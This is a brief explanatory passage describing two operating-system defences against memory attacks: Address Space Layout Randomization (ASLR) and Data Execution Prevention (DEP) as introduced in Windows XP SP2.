**Address Space Layout Randomization** is a security mechanism against buffer overflows. It makes some types of attacks more difficult by making it difficult to find target addresses in memory. The operating system uses ASLR to hide the relevant memory addresses from us. So the addresses need to be guessed, where a wrong address most likely causes a crash of the program, and accordingly, only one attempt exists.

## DEP 

**Data Execution Preventions** a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.

